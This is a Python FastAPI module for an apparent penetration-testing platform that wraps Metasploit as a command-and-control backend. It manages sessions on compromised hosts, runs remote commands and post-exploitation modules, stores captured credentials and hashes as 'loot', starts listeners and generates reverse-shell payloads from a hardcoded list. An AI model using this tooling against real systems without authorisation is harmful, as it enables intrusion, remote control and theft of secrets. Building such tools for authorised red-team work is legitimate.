from fastapi import APIRouter, Depends, HTTPException
from fastapi.responses import Response as FastAPIResponse
from sqlalchemy.orm import Session as DBSession
from pydantic import BaseModel
from typing import Optional
import json
import uuid
from datetime import datetime

from database import get_db, C2Session, LootEntry, C2Task, Target, Project
import services.msf_client as msf

router = APIRouter(prefix="/c2", tags=["c2"])


# ── MSF connection ────────────────────────────────────────────────

class ConnectRequest(BaseModel):
    host: str = "127.0.0.1"
    port: int = 55553
    password: str = ""
    ssl: bool = False


@router.post("/connect")
def connect_msf(req: ConnectRequest):
    ok = msf.connect(host=req.host, port=req.port, password=req.password, ssl=req.ssl)
    if not ok:
        raise HTTPException(503, "Could not connect to Metasploit RPC daemon. Ensure msfrpcd is running.")
    return msf.get_status()


@router.post("/disconnect")
def disconnect_msf():
    msf.disconnect()
    return {"connected": False}


@router.get("/status")
def get_msf_status():
    return msf.get_status()


# ── Sessions ──────────────────────────────────────────────────────

@router.get("/sessions")
def list_sessions(project_id: Optional[str] = None, db: DBSession = Depends(get_db)):
    """List Seraph-tracked sessions, optionally filtered by project."""
    query = db.query(C2Session)
    if project_id:
        query = query.filter(C2Session.project_id == project_id)
    sessions = query.order_by(C2Session.established_at.desc()).all()
    # Enrich with MSF live data
    live = {s["msf_session_id"]: s for s in msf.list_sessions()}
    result = []
    for s in sessions:
        d = {
            "id": s.id,
            "msf_session_id": s.msf_session_id,
            "session_type": s.session_type,
            "platform": s.platform,
            "arch": s.arch,
            "remote_host": s.remote_host,
            "remote_port": s.remote_port,
            "tunnel_peer": s.tunnel_peer,
            "via_exploit": s.via_exploit,
            "via_payload": s.via_payload,
            "status": s.status,
            "notes": s.notes,
            "established_at": s.established_at,
            "last_seen": s.last_seen,
            "project_id": s.project_id,
            "target_id": s.target_id,
            "loot_count": len(s.loot),
            "task_count": len(s.tasks),
            "live": s.msf_session_id in live,
        }
        result.append(d)
    return result


@router.post("/sessions/sync")
def sync_msf_sessions(project_id: str, db: DBSession = Depends(get_db)):
    """Pull live sessions from MSF and create Seraph records for new ones."""
    live_sessions = msf.list_sessions()
    created = []
    for ls in live_sessions:
        existing = db.query(C2Session).filter(
            C2Session.msf_session_id == ls["msf_session_id"],
            C2Session.project_id == project_id,
        ).first()
        if not existing:
            # Try to match target by IP
            remote_host = ls.get("remote_host", "")
            target = None
            if remote_host:
                target = db.query(Target).filter(
                    Target.project_id == project_id,
                    Target.hostname_or_ip == remote_host,
                ).first()
            session = C2Session(
                id=str(uuid.uuid4()),
                project_id=project_id,
                target_id=target.id if target else None,
                msf_session_id=ls["msf_session_id"],
                session_type=ls.get("session_type", "shell"),
                platform=ls.get("platform", ""),
                arch=ls.get("arch", ""),
                remote_host=remote_host,
                remote_port=ls.get("remote_port", ""),
                tunnel_peer=ls.get("tunnel_peer", ""),
                via_exploit=ls.get("via_exploit", ""),
                via_payload=ls.get("via_payload", ""),
                status="active",
            )
            db.add(session)
            created.append(session.id)
    db.commit()
    return {"synced": len(live_sessions), "created": len(created)}


class CreateSessionRequest(BaseModel):
    project_id: str
    target_id: Optional[str] = None
    msf_session_id: Optional[str] = None
    session_type: str = "meterpreter"
    remote_host: str = ""
    remote_port: str = ""
    via_exploit: str = ""
    via_payload: str = ""
    platform: str = ""
    arch: str = ""
    notes: str = ""


@router.post("/sessions")
def create_session(req: CreateSessionRequest, db: DBSession = Depends(get_db)):
    session = C2Session(
        id=str(uuid.uuid4()),
        project_id=req.project_id,
        target_id=req.target_id,
        msf_session_id=req.msf_session_id,
        session_type=req.session_type,
        remote_host=req.remote_host,
        remote_port=req.remote_port,
        via_exploit=req.via_exploit,
        via_payload=req.via_payload,
        platform=req.platform,
        arch=req.arch,
        notes=req.notes,
        status="active",
    )
    db.add(session)
    db.commit()
    db.refresh(session)
    return session


@router.patch("/sessions/{session_id}/status")
def update_session_status(session_id: str, status: str, db: DBSession = Depends(get_db)):
    session = db.query(C2Session).filter(C2Session.id == session_id).first()
    if not session:
        raise HTTPException(404, "Session not found")
    if status not in ("active", "inactive", "lost"):
        raise HTTPException(400, "Invalid status")
    session.status = status
    db.commit()
    return {"id": session_id, "status": status}


@router.delete("/sessions/{session_id}")
def delete_session(session_id: str, kill: bool = False, db: DBSession = Depends(get_db)):
    session = db.query(C2Session).filter(C2Session.id == session_id).first()
    if not session:
        raise HTTPException(404, "Session not found")
    if kill and session.msf_session_id:
        msf.kill_session(session.msf_session_id)
    db.delete(session)
    db.commit()
    return {"deleted": session_id}


# ── Commands / Tasks ──────────────────────────────────────────────

class RunCommandRequest(BaseModel):
    command: str
    timeout: int = 30


@router.post("/sessions/{session_id}/exec")
def run_session_command(session_id: str, req: RunCommandRequest, db: DBSession = Depends(get_db)):
    session = db.query(C2Session).filter(C2Session.id == session_id).first()
    if not session:
        raise HTTPException(404, "Session not found")
    if not session.msf_session_id:
        raise HTTPException(400, "Session has no MSF session ID")

    command = req.command.strip()
    if not command:
        raise HTTPException(400, "Empty command")

    task = C2Task(
        id=str(uuid.uuid4()),
        session_id=session_id,
        command=command,
        status="running",
        executed_at=datetime.utcnow(),
    )
    db.add(task)
    db.commit()

    output = msf.session_run_command(session.msf_session_id, command, timeout=req.timeout)

    task.output = output
    task.status = "done"
    task.completed_at = datetime.utcnow()
    session.last_seen = datetime.utcnow()
    db.commit()

    return {"task_id": task.id, "output": output, "status": "done"}


@router.get("/sessions/{session_id}/tasks")
def get_session_tasks(session_id: str, db: DBSession = Depends(get_db)):
    tasks = db.query(C2Task).filter(C2Task.session_id == session_id).order_by(C2Task.executed_at).all()
    return tasks


# ── Post-exploitation modules ─────────────────────────────────────

@router.get("/post-modules")
def get_post_modules(platform: str = "multi"):
    from services.msf_client import POST_MODULES
    return POST_MODULES.get(platform, POST_MODULES["multi"])


class RunPostModuleRequest(BaseModel):
    session_id: str       # Seraph session ID
    module_name: str
    options: dict = {}


@router.post("/post-modules/run")
def run_post_module(req: RunPostModuleRequest, db: DBSession = Depends(get_db)):
    import re
    session = db.query(C2Session).filter(C2Session.id == req.session_id).first()
    if not session:
        raise HTTPException(404, "Session not found")
    if not session.msf_session_id:
        raise HTTPException(400, "No MSF session ID")
    if not re.match(r'^post/[\w/]+$', req.module_name):
        raise HTTPException(400, "Invalid module name")

    opts = {"SESSION": session.msf_session_id}
    for k, v in req.options.items():
        if re.match(r'^\w+$', str(k)):
            opts[k] = v

    result = msf.run_module("post", req.module_name.replace("post/", "", 1), opts)
    return result


# ── Loot ──────────────────────────────────────────────────────────

@router.get("/sessions/{session_id}/loot")
def get_session_loot(session_id: str, db: DBSession = Depends(get_db)):
    return db.query(LootEntry).filter(LootEntry.session_id == session_id).order_by(LootEntry.captured_at.desc()).all()


@router.get("/loot")
def get_all_loot(project_id: Optional[str] = None, db: DBSession = Depends(get_db)):
    query = db.query(LootEntry)
    if project_id:
        query = query.join(C2Session).filter(C2Session.project_id == project_id)
    return query.order_by(LootEntry.captured_at.desc()).all()


class AddLootRequest(BaseModel):
    session_id: str
    loot_type: str = "credential"
    title: str
    content: str = ""
    source_path: str = ""


@router.post("/loot")
def add_loot(req: AddLootRequest, db: DBSession = Depends(get_db)):
    valid_types = {"credential", "hash", "file", "key", "secret", "system_info", "other"}
    if req.loot_type not in valid_types:
        raise HTTPException(400, "Invalid loot type")
    entry = LootEntry(
        id=str(uuid.uuid4()),
        session_id=req.session_id,
        loot_type=req.loot_type,
        title=req.title,
        content=req.content,
        source_path=req.source_path,
    )
    db.add(entry)
    db.commit()
    db.refresh(entry)
    return entry


@router.post("/loot/sync-msf")
def sync_msf_loot(session_id: str, db: DBSession = Depends(get_db)):
    """Pull loot from MSF DB and store as LootEntries."""
    session = db.query(C2Session).filter(C2Session.id == session_id).first()
    if not session:
        raise HTTPException(404, "Session not found")
    msf_loot = msf.get_loot(session.msf_session_id)
    created = 0
    for item in msf_loot:
        entry = LootEntry(
            id=str(uuid.uuid4()),
            session_id=session_id,
            loot_type=item.get("loot_type", "other"),
            title=item.get("name") or item.get("info") or "MSF Loot",
            content=item.get("data", ""),
            source_path=item.get("path", ""),
        )
        db.add(entry)
        created += 1
    db.commit()
    return {"synced": created}


@router.delete("/loot/{loot_id}")
def delete_loot(loot_id: str, db: DBSession = Depends(get_db)):
    entry = db.query(LootEntry).filter(LootEntry.id == loot_id).first()
    if not entry:
        raise HTTPException(404, "Loot entry not found")
    db.delete(entry)
    db.commit()
    return {"deleted": loot_id}


# ── Listeners ─────────────────────────────────────────────────────

class StartListenerRequest(BaseModel):
    payload: str
    lhost: str
    lport: int
    extra_opts: dict = {}


@router.post("/listeners/start")
def start_listener(req: StartListenerRequest):
    import re
    if not re.match(r'^[\w\.\-]+$', req.lhost):
        raise HTTPException(400, "Invalid LHOST")
    result = msf.start_listener(
        payload=req.payload,
        lhost=req.lhost,
        lport=req.lport,
        extra_opts=req.extra_opts,
    )
    if "error" in result:
        raise HTTPException(500, result["error"])
    return result


@router.get("/listeners")
def list_listeners():
    return msf.list_jobs()


@router.delete("/listeners/{job_id}")
def stop_listener(job_id: str):
    ok = msf.stop_job(job_id)
    if not ok:
        raise HTTPException(500, "Failed to stop listener")
    return {"stopped": job_id}


# ── Payload generation ────────────────────────────────────────────

COMMON_PAYLOADS = [
    {"value": "linux/x64/meterpreter/reverse_tcp", "label": "Linux x64 Meterpreter (TCP)", "platform": "linux", "arch": "x64", "formats": ["elf", "raw"]},
    {"value": "linux/x86/meterpreter/reverse_tcp", "label": "Linux x86 Meterpreter (TCP)", "platform": "linux", "arch": "x86", "formats": ["elf", "raw"]},
    {"value": "linux/x64/shell/reverse_tcp", "label": "Linux x64 Shell (TCP)", "platform": "linux", "arch": "x64", "formats": ["elf", "raw"]},
    {"value": "windows/x64/meterpreter/reverse_tcp", "label": "Windows x64 Meterpreter (TCP)", "platform": "windows", "arch": "x64", "formats": ["exe", "dll", "raw"]},
    {"value": "windows/meterpreter/reverse_tcp", "label": "Windows x86 Meterpreter (TCP)", "platform": "windows", "arch": "x86", "formats": ["exe", "dll", "raw"]},
    {"value": "windows/x64/shell/reverse_tcp", "label": "Windows x64 Shell (TCP)", "platform": "windows", "arch": "x64", "formats": ["exe", "raw"]},
    {"value": "osx/x64/meterpreter/reverse_tcp", "label": "macOS x64 Meterpreter (TCP)", "platform": "osx", "arch": "x64", "formats": ["macho", "raw"]},
    {"value": "php/meterpreter/reverse_tcp", "label": "PHP Meterpreter (TCP)", "platform": "php", "arch": "php", "formats": ["raw"]},
    {"value": "python/meterpreter/reverse_tcp", "label": "Python Meterpreter (TCP)", "platform": "python", "arch": "python", "formats": ["raw"]},
    {"value": "java/meterpreter/reverse_tcp", "label": "Java Meterpreter (TCP)", "platform": "java", "arch": "java", "formats": ["jar"]},
    {"value": "android/meterpreter/reverse_tcp", "label": "Android Meterpreter (TCP)", "platform": "android", "arch": "dalvik", "formats": ["apk"]},
    {"value": "linux/x64/meterpreter_reverse_https", "label": "Linux x64 Meterpreter (HTTPS)", "platform": "linux", "arch": "x64", "formats": ["elf", "raw"]},
    {"value": "windows/x64/meterpreter_reverse_https", "label": "Windows x64 Meterpreter (HTTPS)", "platform": "windows", "arch": "x64", "formats": ["exe", "raw"]},
]


@router.get("/payloads")
def list_payloads():
    return COMMON_PAYLOADS


class GeneratePayloadRequest(BaseModel):
    payload: str
    lhost: str
    lport: int
    format: str = "elf"
    arch: str = "x86_64"
    platform: str = "linux"
    extra_opts: dict = {}


@router.post("/payloads/generate")
def generate_payload(req: GeneratePayloadRequest):
    import re, shutil
    if not shutil.which("msfvenom"):
        raise HTTPException(503, "msfvenom not found. Install Metasploit Framework.")
    try:
        data = msf.generate_payload(
            payload=req.payload,
            lhost=req.lhost,
            lport=req.lport,
            fmt=req.format,
            arch=req.arch,
            platform=req.platform,
            extra_opts=req.extra_opts,
        )
    except ValueError as e:
        raise HTTPException(400, str(e))
    if data is None:
        raise HTTPException(500, "msfvenom failed to generate payload")

    ext_map = {"elf": "elf", "exe": "exe", "dll": "dll", "raw": "bin", "php": "php", "python": "py", "jar": "jar", "apk": "apk", "macho": "macho", "bash": "sh"}
    ext = ext_map.get(req.format, "bin")
    payload_slug = req.payload.replace("/", "_")

    return FastAPIResponse(
        content=data,
        media_type="application/octet-stream",
        headers={"Content-Disposition": f'attachment; filename="payload_{payload_slug}.{ext}"'},
    )
